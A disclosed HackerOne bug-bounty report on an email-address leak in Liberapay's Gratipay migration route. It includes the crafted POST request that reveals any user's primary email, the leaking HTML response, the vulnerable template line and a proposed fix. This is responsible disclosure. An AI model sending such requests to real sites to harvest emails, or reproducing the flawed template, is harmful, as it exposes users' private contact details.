# Email Address Exposure via Gratipay Migration Tool

## Report Details
- **Report ID**: 1727044
- **URL**: https://hackerone.com/reports/1727044
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2022-10-07T22:40:56.667Z
- **Disclosed**: 2022-10-09T11:50:43.637Z

## Reporter
- **Username**: suprnova
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: liberapay

## Vulnerability Information
Through the `/migrate` route, an attacker can input the username of any user on the site and retrieve their primary email address without any authorization required.

# Steps to reproduce:

#### Note: This cannot be performed with `hackerone-target`, because that account seems to return a `None` as an email.
1. Craft and post an HTTP request that fakes step 1 of the migration process through Gratipay, with any email in the `email_address` field and the target's username in the `username` field.
```http
POST /migrate?step=2 HTTP/1.1
Host: liberapay.com
Cookie: XXXXXXX
X-CSRF-TOKEN: XXXXXXX
Content-Type: application/x-www-form-urlencoded

email_address=suprnova+gratipay@wearehackerone.com&username=suprnova
```
2. Examine the HTML of the response.
```html
<form action="" method="POST">
  <input type="hidden" name="form.repost" value="true" />
  <input type="hidden" name="email_address" value="suprnova+gratipay@wearehackerone.com" />
  <input type="hidden" name="username" value="suprnova" />
  <div class="alert alert-danger">The username &#39;<a href="/Suprnova/">Suprnova</a>&#39; is already taken.</div>
  <p>Does this existing account belong to you?</p>
  <p class="buttons">
    <button class="btn btn-default btn-lg"
      name="log-in.id" value="suprnova+very-secret-email-address@wearehackerone.com"
      >Yes</button>
    <button class="btn btn-default btn-lg"
      name="ignore-conflict" value="true"
      >No</button>
  </p>
</form>
```
The `value` field for `log-in.id` has been automatically populated with the primary email address of the target.

# Vulnerable Code
The problematic code can be found in the file [www/migrate.spt:349](https://github.com/liberapay/liberapay.com/blob/1f1a4b605def37aa9bed55586c7425a819c3fcdf/www/migrate.spt#L349).
```html
<p class="buttons">
  <button class="btn btn-default btn-lg"
    name="log-in.id" value="{{ existing_account.email }}"
    >{{ _("Yes") }}</button>
  <button class="btn btn-default btn-lg"
    name="ignore-conflict" value="true"
    >{{ _("No") }}</button>
</p>
```
The website automatically displays the email address of the existing account, despite the current user's lack of authorization to view that information.

# Mitigation:
To mitigate this exposure, the value for "log-in.id" could instead refer to the ID number of the account being referred to.

## Impact

A malicious attacker could simply identify any user on the site and instantly access their email address from the database to be used elsewhere, regardless of the victim's privacy settings.

## Attachments
No attachments
